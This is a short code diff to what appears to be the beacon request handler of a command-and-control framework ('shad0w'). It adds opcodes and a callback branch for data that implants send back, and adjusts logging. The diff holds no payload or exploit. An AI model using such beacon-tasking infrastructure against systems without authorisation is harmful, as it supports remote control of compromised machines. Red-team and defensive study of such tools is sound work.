@@ -5,6 +5,8 @@ from lib import tools
 from .responce_builder import Builder
 
 DATA_CMD_OUT = 0x2000
+DATA_CMD_PRO = 0x3000
+DO_CALLBACK  = 0x4000
 
 class Handler(object):
 
@@ -23,6 +25,9 @@ class Handler(object):
         # print(request.get_json(force=True))
 
         jdata = request.get_json(force=True)
+        
+        # print("jdata: ", jdata)
+
         beacon_id, opcode, data = tools.get_data_from_json(jdata)
 
         # only if were given an id by the beacon
@@ -40,7 +45,7 @@ class Handler(object):
                     # clear the task
                     self.shad0w.beacons[beacon_id]["task"] = None
                     # inform user
-                    self.shad0w.debug.good(f"Beacon ({beacon_id}) received task")
+                    self.shad0w.debug.log(f"Beacon ({beacon_id}) received task", log=True)
                     return task
                 
                 # check if the data is for the current beacon
@@ -48,8 +53,10 @@ class Handler(object):
                     # check if we should display the data
                     if opcode == DATA_CMD_OUT:
                         # need to find a nicer way to display the data
-                        # self.shad0w.debug.good(f"recived {len(data)} bytes:\n\n{data}")
                         sys.stdout.write(data)
+                    if opcode == DO_CALLBACK:
+                        callback = self.shad0w.beacons[beacon_id]["callback"]
+                        return callback(self.shad0w, data)
                     return task
 
                 # another session has returned data
